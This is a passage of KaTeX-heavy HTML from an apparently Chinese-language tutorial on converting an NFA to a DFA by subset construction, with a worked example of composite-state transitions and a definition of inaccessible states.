encoding="application/x-tex">q_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>想象成一个状态，一个综合状态，这就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>1</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[q_0,q_1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>的含义了。</p><p>这个状态转移图就是把所有可能的综合状态遍历的一遍，首先是单个状态的综合状态 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><msub><mi>q</mi><mn>0</mn></msub><mo stretchy="false">]</mo><mi mathvariant="normal">、</mi><mo stretchy="false">[</mo><msub><mi>q</mi><mn>1</mn></msub><mo stretchy="false">]</mo><mi mathvariant="normal">、</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo stretchy="false">[</mo><msub><mi>q</mi><mn>3</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[q_0]、[q_1]、..[q_3]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mord cjk_fallback">、</span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mord cjk_fallback">、</span><span class="mord">.</span><span class="mord">.</span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>，到最后4个状态的的综合状态<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>3</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[q_0,q_1,q_2,q_3]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>。分别写出它们在获得输入字符后的状态转移。</p><p>这里举个例子，我们要获得<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>3</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[q_0,q_1,q_2,q_3]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>在输入字符为0的情况下的转移状态要怎么办呢？我们就看这个综合状态中的每个状态获得字符0的情况，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">q_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>获得0会到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">q_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">q_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">q_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>获得0会到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">q_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">q_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>不会获得0， <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">q_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>获得0会到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">q_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。所以综合一下可能的状态是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">q_0,q_1,q_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，同样由于DFA无法同时处理三个状态，便把它们假象称为一个综合状态<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>3</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[q_0,q_1,q_3]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>。这和表中的结果也是一致的。</p><p>同时我们注意到表格中有些打了勾，有些没打，那是什么意思呢？这里需要引出不可达状态的概念。</p><p>不可达状态(inaccessible state)：不存在从<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><msub><mi>q</mi><mn>0</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[q_0]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>对应的顶点出发，到达该状态对应的顶点的路。我们称此状态 从开始状态是不可达的。</p><p>我们看<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><msub><mi>q</mi><mn>0</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[q_0]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>会到达<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>1</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[q_0,q_1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>2</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[q_0,q_2]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>。然后<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>1</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[q_0,q_1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>会到达<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>3</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[q_0,q_1,q_3]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span 